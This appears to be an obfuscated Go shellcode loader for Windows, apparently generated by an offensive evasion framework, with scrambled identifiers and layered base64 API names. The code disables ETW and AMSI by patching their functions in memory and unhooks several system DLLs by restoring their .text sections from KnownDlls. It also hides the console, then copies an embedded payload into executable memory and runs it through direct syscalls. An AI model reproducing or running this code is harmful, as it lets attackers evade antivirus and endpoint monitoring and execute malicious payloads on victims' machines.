
	
	package main

	
	

	import (
		filepe "debug/pe"
		"encoding/base64"
		"encoding/hex"
		
		"HaNBFbgSdCWg/HaNBFbgSdCWg"
		"strconv"
		"fmt"
		"syscall"
		"unsafe"
		"time"
		


		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"
		"github.com/Binject/debug/pe"
		"github.com/awgh/rawreader"
	)
	


	const (
		EjdJkAi= 0x1F0FFF
	)
	var _ unsafe.Pointer
	var (
		VtCMQpf uint16
		opSqb uint16
		RBwPJxy int = 5
	)

	
	
	
	
	func ysOZwtiY() string {
		ujFlZz, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		zfRLjxi, _, _ :=  ujFlZz.GetStringValue("CurrentVersion")
		JtWyg, _, err := ujFlZz.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			//pFMnNcq, _, _ := ujFlZz.GetIntegerValue("CurrentMinorVersionNumber")
			zfRLjxi = strconv.FormatUint(JtWyg, 10)
		}
		defer ujFlZz.Close()
		if zfRLjxi == "10" {
			VtCMQpf = 0x18
			opSqb = 0x50
		} else if zfRLjxi == "6.3" {
			VtCMQpf = 0x17
			opSqb = 0x4f
		} else if zfRLjxi == "6.2" {
			VtCMQpf = 0x16
			opSqb = 0x4e
		} else if zfRLjxi == "6.1" {
			VtCMQpf = 0x15
			opSqb= 0x4d
		}
		return zfRLjxi 

	}

	func sqapuI(JZewBDw string,) string {
		var AouoJWE []byte
			AouoJWE, _ = base64.StdEncoding.DecodeString(JZewBDw)
		flFN := 1
		for i := 1; i < RBwPJxy; i++ {
			AouoJWE, _ = base64.StdEncoding.DecodeString(string(AouoJWE))
			flFN += i
		}
		return string(AouoJWE)
	
	}

	

	func vXwOfkkVuCPlJoQu(show bool) {
		QrUfedqmoPjxrCnF := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(sqapuI("Vmxkd1MxWXdNVWRTV0d4UVYwWmFjVlJYY0hObGJHUnpWMjEwYWxJd2NEQldWelZoWVRKU05rMUVhejA9"))
		dSJJILuxbV := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc(sqapuI("Vm14U1MySXlVblJWV0doaFUwVktjRmxzV2t0TmJIQkpXWHBzVVZWVU1Eaz0="))
		vdjfLVHQvxOLIR, _, _ := QrUfedqmoPjxrCnF.Call()
		if vdjfLVHQvxOLIR == 0 {
			return
		}
		if show {
		var aQDVYeabIhDUntRew uintptr = 9
		dSJJILuxbV.Call(vdjfLVHQvxOLIR, aQDVYeabIhDUntRew)
		} else {
		var jKqITrKYUrookWJ uintptr = 0
		dSJJILuxbV.Call(vdjfLVHQvxOLIR, jKqITrKYUrookWJ)
		}
	}



	
	const (
		tSKyYNm= 997
	)
	var WuKgeZS error = syscall.Errno(tSKyYNm)
	var oskm = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(sqapuI("Vm0xd1QxTXlUa2hWYTJoWFlrVmFjVmxzVW5OalZtUnpZVVU1YkdKR1NsbFdiVFZUWVZVd2QySjZSVDA9"))


	func QfODk(crLAiZ uintptr, jEQaPxr uintptr, hCmUN *byte, WekdgBwA uintptr, MjqgFAK *uintptr) (err error) {
		r1, _, e1 := syscall.Syscall6(oskm.Addr(), 5, uintptr(crLAiZ), uintptr(jEQaPxr), uintptr(unsafe.Pointer(hCmUN)), uintptr(WekdgBwA), uintptr(unsafe.Pointer(MjqgFAK)), 0)
		if r1 == 0 {
			if e1 != 0 {
				err = LrVs(e1)
			} else {
				err = syscall.EINVAL
			}
		}
		return
	}

	func LrVs(e syscall.Errno) error {
		switch e {
		case 0:
			return nil
		case tSKyYNm:
			return WuKgeZS
		}
	
		return e
	}
	

	
	var uZfobaNH = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(sqapuI("VmxkNGIxVXdNSGhWYmxKUVZrVktiMVpxUm5ka01XUlZVMnRrVGxJd1dsbFVNV2hYVm0xS1YxZHVWbHBXYldoUVZGVmFkMWRXVGxWTlJEQTk="))
	var xywrKnC = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(sqapuI("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0V1JtUnpXa2QwYWxJd01UWldWekUwWVd4d05rMUVhejA9"))
	var mslcxQ = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(sqapuI("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0WFZtdDVUVmhPVGxKdVFsZFdNbkJIWVZaSmVsbDZhejA9"))
	var ubVmQ = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(sqapuI("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0WFZtdDVUVmhPVGxKdVFsTlZSbEYzVUZFOVBRPT0="))

	func XmVNEsE() {
		jJHK := uintptr(0xffffffffffffffff)
		HqOfXC := []uintptr{ uZfobaNH.Addr(), xywrKnC.Addr(), mslcxQ.Addr(), ubVmQ.Addr()}
		for i, _ := range HqOfXC {
			lVcxWCl, _ := hex.DecodeString("4833C0C3")
			var ZDLaiPa uintptr
			FMRhFRq := len(lVcxWCl)
			QfODk(jJHK, HqOfXC[i], &lVcxWCl[0], uintptr(uint32(FMRhFRq)), &ZDLaiPa)
		}
	}

	func UNIn(jJHK windows.Handle) {
		HqOfXC := []uintptr{ uZfobaNH.Addr(), xywrKnC.Addr(), mslcxQ.Addr(), ubVmQ.Addr()}
		for i, _ := range HqOfXC {
			lVcxWCl, _ := hex.DecodeString("4833C0C3")
			var ZDLaiPa uintptr
			FMRhFRq := len(lVcxWCl)
			QfODk(uintptr(jJHK), HqOfXC[i], &lVcxWCl[0], uintptr(uint32(FMRhFRq)), &ZDLaiPa)
		}
	}



	
	func LplaDJw() {
		var HRDu uint64
		HRDu = 0xffffffffffffffff
		hIDASXSU, _ := windows.LoadLibrary(string([]byte{'a','m','s','i','.','d','l','l'}))
		nPvURFL, _ := windows.GetProcAddress(hIDASXSU, string([]byte{'a','m','s','i','S','c','a','n','B','u','f','f','e','r'}))
		rRFy, _ :=  hex.DecodeString("B857000780C3")
		var msDPnG uintptr
		dpzzv := len(rRFy)
		QfODk(uintptr(HRDu), uintptr(uint(nPvURFL)), &rRFy[0], uintptr(uint32(dpzzv)), &msDPnG)
	}
	

	var procReadProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc("ReadProcessMemory")

	func fJXEmhh() uintptr {
		var funcNtAllocateVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc("NtAllocateVirtualMemory")
		handle := uintptr(0xffffffffffffffff)
		num := 2
		var add uintptr
		AllAddr := funcNtAllocateVirtualMemory.Addr()
		for i := 0; i < 20; i++ {
			rawr, _, _ := ReadProcessMemory(handle, AllAddr+uintptr(i), uintptr(num))
			f := fmt.Sprintf("%0x", rawr)
			if f == "0f05" {
				add = AllAddr + uintptr(i)
				return add
			}
		}
		return add
	}

	func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, nSize uintptr) (lpBuffer []uint8, lpNumberOfBytesRead int, ok bool) {
		var nBytesRead int
		buf := make([]uint8, nSize)
		ret, _, _ := procReadProcessMemory.Call(
			uintptr(hProcess),
			lpBaseAddress,
			uintptr(unsafe.Pointer(&buf[0])),
			nSize,
			uintptr(unsafe.Pointer(&nBytesRead)),
		)
	
		return buf, nBytesRead, ret != 0
	}
	
		

	func main() {
		
		XmVNEsE()
		LplaDJw()
		time.Sleep(2593 * time.Millisecond)
		zfRLjxi := ysOZwtiY()
		
		if zfRLjxi == "10" {
			QhpxzWCktWwvczdlo()
		}
		XmVNEsE()
		vXwOfkkVuCPlJoQu(false)
		vZQfuFQUSlkDDTlt := HaNBFbgSdCWg.VfgQtYlpOuLrWkgMy()
		XCgLjEycuiUBr(vZQfuFQUSlkDDTlt)
	}

	
	func XCgLjEycuiUBr(vZQfuFQUSlkDDTlt []byte){
		oexVDrDtgp := windows.NewLazySystemDLL("ntdll.dll")
		eGQtmrREfMYg := windows.NewLazySystemDLL("kernel32")
		pIusQjfPuXenpu := oexVDrDtgp.NewProc("RtlCopyMemory")
		fgVgPqRZQG := eGQtmrREfMYg.NewProc("VirtualAlloc")

		var zivbIofKvmiwK, hMNhhjFVKQi uintptr
		var BIRDdwpdAttO uintptr
		kNSUdOxFTlnKdXAWZB := uintptr(0xffffffffffffffff)
		belzfJrcztI := uintptr(len(vZQfuFQUSlkDDTlt))
		hMNhhjFVKQi = 0x40
		zivbIofKvmiwK = 0x3000
		UFeudvYcUr, _, _ := fgVgPqRZQG.Call(0, uintptr(len(vZQfuFQUSlkDDTlt)), zivbIofKvmiwK, hMNhhjFVKQi)

		
		pIusQjfPuXenpu.Call(UFeudvYcUr, (uintptr)(unsafe.Pointer(&vZQfuFQUSlkDDTlt[0])), uintptr(len(vZQfuFQUSlkDDTlt)))
		
		


		HaNBFbgSdCWg.IXGirLyUqlp(
			opSqb, 
			kNSUdOxFTlnKdXAWZB,
			(*uintptr)(unsafe.Pointer(&UFeudvYcUr)),
			&belzfJrcztI,
			0x20,
			&BIRDdwpdAttO,
			)
		
		syscall.Syscall(UFeudvYcUr, 0, 0, 0, 0)
	}


	
	
		var DGZFXvhGVs      uint16
		var FkiIQEQmWVrThF uint16
		var qBycAwaADKKDQEcS      uint16
		func QhpxzWCktWwvczdlo()  {
			asARxQyOLHWto := []string{string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
			string([]byte{'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'})}
		
	 	for i, _ := range asARxQyOLHWto {
			KnownDLL(asARxQyOLHWto[i])
			}
		}

		var procNtOpenSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenSection")
		var procNtMapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtMapViewOfSection")
		var procNtUnmapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtUnmapViewOfSection")

		type sstring struct {
			PWstr *uint16
		}
	
		func (s sstring) String() string {
			return windows.UTF16PtrToString(s.PWstr)
		}
	
		func KnownDLL(wgoMqEvkLmrS  string) []byte {
			
			var oxiNVpEzUIbs , PXjtMJLWkrNktKp , xgjyBNImFf  uintptr
			rvMWqCTdQwvrvHx := uintptr(0xffffffffffffffff)
			sSEDiCGiuTL := "\\" + string([]byte{'K', 'n', 'o', 'w', 'n', 'D', 'l', 'l', 's'}) + "\\" + wgoMqEvkLmrS 
			zLsrAGygulWcVgYE, _ := windows.NewNTUnicodeString(sSEDiCGiuTL)
			QOCYDTtXFCHOtfgGUo := windows.OBJECT_ATTRIBUTES{}
			QOCYDTtXFCHOtfgGUo.Attributes = 0x00000040
			QOCYDTtXFCHOtfgGUo.ObjectName = zLsrAGygulWcVgYE
			QOCYDTtXFCHOtfgGUo.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
			oPAMQdguDnr := fJXEmhh()
			DGZFXvhGVs = 0x37
			xWWZLzjMkr := 0x0004
			r, _ := HaNBFbgSdCWg.ZSAQMVvivoSmxSCqHiE(
				DGZFXvhGVs, 
				oPAMQdguDnr, 
				uintptr(unsafe.Pointer(&oxiNVpEzUIbs)), 
				uintptr(xWWZLzjMkr), 
				uintptr(unsafe.Pointer(&QOCYDTtXFCHOtfgGUo)),
			)
			if r != 0 {
			}
			FkiIQEQmWVrThF = 0x28
			zero := 0
			one := 1
			HaNBFbgSdCWg.BoDyPXUtuuzoqAmcng(
				FkiIQEQmWVrThF, 
				oPAMQdguDnr, 
				oxiNVpEzUIbs, 
				rvMWqCTdQwvrvHx, 
				uintptr(unsafe.Pointer(&xgjyBNImFf)), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(unsafe.Pointer(&PXjtMJLWkrNktKp)), 
				uintptr(one), 
				uintptr(zero), 
				uintptr(syscall.PAGE_READONLY),
			)
			CLanaiKDImbjwFd := rawreader.New(xgjyBNImFf, int(PXjtMJLWkrNktKp))
			qCgNZZVNeKPStenK, _ := pe.NewFileFromMemory(CLanaiKDImbjwFd)
			rzaAuAobHE, err := qCgNZZVNeKPStenK.Bytes()
			if err != nil {
			}
			HVceNbzUZEYQrr := qCgNZZVNeKPStenK.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
			udZZyCRedrl := rzaAuAobHE[HVceNbzUZEYQrr.Offset:HVceNbzUZEYQrr.Size]
			IEHvQYYycA, error := filepe.Open(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  wgoMqEvkLmrS )
			if error != nil {
			}
			MAQjcZsSymYTmyc := IEHvQYYycA.Section(".text")
			ANTtumuZsLkXfa, error := windows.LoadDLL(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  wgoMqEvkLmrS )
			if error != nil {
			}
			dmKHimLiTAAzJExa := ANTtumuZsLkXfa.Handle
			HXsBWZeFXuW  := uintptr(dmKHimLiTAAzJExa)
			qESZJdQYIyF := uint(HXsBWZeFXuW) + uint(MAQjcZsSymYTmyc.VirtualAddress)
			qBycAwaADKKDQEcS = 0x50
			HOYRiBBtUGtNteSj := uintptr(len(udZZyCRedrl))
			var hKhpwnQYUUXG uintptr

			EiwCGRULedXjDeW, _ := HaNBFbgSdCWg.UzETmbJSCDASrUhts(
				qBycAwaADKKDQEcS, 
				oPAMQdguDnr, 
				rvMWqCTdQwvrvHx, 
				(*uintptr)(unsafe.Pointer(&qESZJdQYIyF)), 
				&HOYRiBBtUGtNteSj, 
				0x40, 
				&hKhpwnQYUUXG,
			)
			if EiwCGRULedXjDeW != 0 {
			}
			BJggbyRYoA(udZZyCRedrl, uintptr(qESZJdQYIyF))
			IEHvQYYycA.Close()
			EiwCGRULedXjDeW, _ = HaNBFbgSdCWg.UzETmbJSCDASrUhts(
				qBycAwaADKKDQEcS, 
				oPAMQdguDnr, 
				rvMWqCTdQwvrvHx, 
				(*uintptr)(unsafe.Pointer(&qESZJdQYIyF)), 
				&HOYRiBBtUGtNteSj, 
				0x20, 
				&hKhpwnQYUUXG,
			)
			if EiwCGRULedXjDeW != 0 {
			}
			syscall.Syscall(uintptr(procNtUnmapViewOfSection.Addr()), 2, uintptr(rvMWqCTdQwvrvHx), xgjyBNImFf, 0)
			return udZZyCRedrl
		}


		func BJggbyRYoA(zkIiNnxnBTiqDMymv []byte, BSLJYkNrIUbqs uintptr) {
			for HIXcZsTUyfJiSnmcz := uint32(0); HIXcZsTUyfJiSnmcz < uint32(len(zkIiNnxnBTiqDMymv)); HIXcZsTUyfJiSnmcz++ {
				lLBRPEMKDJUwwQWbA := unsafe.Pointer(BSLJYkNrIUbqs + uintptr(HIXcZsTUyfJiSnmcz))
				DDmdcTRxmDEnV := (*byte)(lLBRPEMKDJUwwQWbA)
				*DDmdcTRxmDEnV = zkIiNnxnBTiqDMymv[HIXcZsTUyfJiSnmcz]
			}
		}

	
